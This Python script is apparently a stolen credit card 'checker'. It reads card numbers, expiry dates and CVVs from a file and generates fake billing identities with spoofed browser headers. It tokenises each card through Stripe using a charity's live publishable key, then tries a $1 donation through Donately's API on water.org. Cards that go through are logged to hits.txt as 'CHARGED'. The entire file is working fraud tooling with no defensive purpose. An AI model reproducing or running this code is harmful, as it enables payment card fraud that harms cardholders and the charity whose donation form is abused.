import requests
import uuid
import random
from faker import Faker
from fake_useragent import UserAgent
import json

from modules.log import *

fake = Faker()
ua = UserAgent()

def check(cc:str):
    billing_details = create_fake_info()
    stripe_api = 'https://api.stripe.com/v1/tokens'
    donation_api = 'https://api.donately.com/v2/donations'    

    parts = cc.split('|')

    if len(parts) < 4:
        log(400, "FAIL", "CC must be in format ccn|mes|ano|cvv")

    stripe_headers = {
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "priority": "u=1, i",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133")"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "User-Agent": billing_details['User-Agent']
    }

    stripe_data = {
        'guid': str(uuid.uuid4()),
        'muid': str(uuid.uuid4()),
        'sid': str(uuid.uuid4()),
        'referrer': 'https://water.org',
        'time_on_page': random.randint(500000, 999999),
        'card[name]': billing_details["name"],
        'card[address_line1]': billing_details["address"],
        'card[address_city]': billing_details["city"],
        'card[address_state]': billing_details["state"],
        'card[address_zip]': billing_details["zip"],
        'card[address_country]': 'US',
        'card[currency]': 'USD',
        'card[number]': parts[0],
        'card[cvc]': parts[3],
        'card[exp_month]': parts[1],
        'card[exp_year]': parts[2],
        'payment_user_agent': 'stripe.js/18400c65be; stripe-js-v3/18400c65be; card-element',
        'pasted_fields': 'number',
        'key': 'pk_live_acvaaTznM4HgDDVaT0hKJmFQ',
        '_stripe_version': '2022-11-15'
    }

    stripe_response = requests.post(stripe_api, data=stripe_data, headers=stripe_headers)
    if "id" not in stripe_response.json():
        return log(400, "FAIL", "Stripe card tokenization failed!")
    tok = stripe_response.json()["id"]

    donation_params = {
        'account_id': 'act_dd6d76ceed12',
        'donation_type': 'cc',
        'amount_in_cents': '100',
        'form_id': 'frm_f5409329a0bf',
        'x1': '86dea97402d22f6453bd9e4afa008c23'
    }
    
    donation_headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json; charset=UTF-8",
        "donately-version": "2022-12-15",
        "idempotency-key": str(uuid.uuid4()),
        "origin": "https://water.org",
        "priority": "u=1, i",
        "User-Agent": billing_details['User-Agent'],
    }

    donation_data = {
        'first_name': str(billing_details['name']).split(' ')[0],
        'last_name': str(billing_details["name"]).split(' ')[1],
        'email': '', # email here
        'currency': 'USD',
        'amount': '100.00',
        'payment_auth': json.dumps({'stripe_token': tok})
    }

    donation_response = requests.post(donation_api, params=donation_params, headers=donation_headers, json=donation_data)
    if donation_response.status_code // 100 == 2:
        log(donation_response.status_code, 'SUCCESS', f'{cc} - [ 🔥 CHARGED $1.0 ]')
        with open('hits.txt', 'a') as f:
            if not 'person' in donation_response.json() or not 'name' in donation_response.json():
                print("fake charge")
            else:
                f.write(f"{donation_response.json()['person']['name']} " + cc + "\n")
            
    else:
        log(donation_response.status_code, 'FAIL', f'{cc} - [ ❌ DECLINED ]')

        with open('logs.txt', 'a') as f:
            try:
                f.write(str(donation_response.json()) + "\n")
            except requests.exceptions.JSONDecodeError:
                f.write(donation_response.content.decode())



def process_card_file(file):
    with open(file, "r") as ccf:
        c = ccf.readlines()

        for line in c:
            if len(line.strip('|')) < 4:
                pass
            else: 
                check(line.strip())


def create_fake_info():
    info = {
        'name': fake.name(),
        'address': fake.street_address(),
        'email': fake.email(domain='gmail.com'),
        'city': fake.city(),
        'zip': fake.zipcode(),
        'state': fake.state_abbr(),
        'User-Agent': ua.random
    }

    return info

if __name__ == "__main__":
    process_card_file('cc.txt')

    